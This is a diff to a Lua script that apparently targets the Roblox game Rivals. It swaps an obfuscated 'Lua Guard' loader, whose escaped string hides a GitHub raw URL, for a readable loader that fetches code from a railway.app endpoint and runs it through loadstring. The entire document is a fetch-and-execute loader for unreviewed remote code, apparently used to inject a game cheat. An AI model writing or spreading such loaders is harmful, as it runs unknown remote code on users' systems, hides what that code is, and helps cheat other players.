@@ -1,5 +1,47 @@
---[[ Protected by Lua Guard ]]
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 
-( function (...) local _IIlIlIlIlI = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\106\105\120\121\117\107\049\050\110\104\045\109\097\107\101\114\047\082\105\118\097\108\115\095\115\099\114\105\112\116\047\109\097\105\110\047\106\105\120\121\117\107\049\050\110\104\046\108\117\097" local _llllllllll = game:HttpGet(_IIlIlIlIlI) local _lIIlIIlIll = loadstring(_llllllllll) if _lIIlIIlIll then _lIIlIIlIll() end
- end
- )(...)
+local PLACE_ID = 17625359962
+local SCRIPT_URL = "https://railway-script-api-production.up.railway.app/script"
+
+local function isRivals()
+    return game.PlaceId == PLACE_ID
+end
+
+local function getScript()
+    local ok, result = pcall(function()
+        return game:HttpGet(SCRIPT_URL)
+    end)
+
+    if not ok or type(result) ~= "string" or #result == 0 then
+        return nil
+    end
+
+    return result
+end
+
+local function execute(source)
+    local compiler = loadstring
+    if type(compiler) ~= "function" then
+        return false
+    end
+
+    local ok, fn = pcall(compiler, source)
+    if not ok or type(fn) ~= "function" then
+        return false
+    end
+
+    local success = pcall(fn)
+    return success
+end
+
+if not isRivals() then
+    return
+end
+
+local source = getScript()
+if not source then
+    return
+end
+
+execute(source)
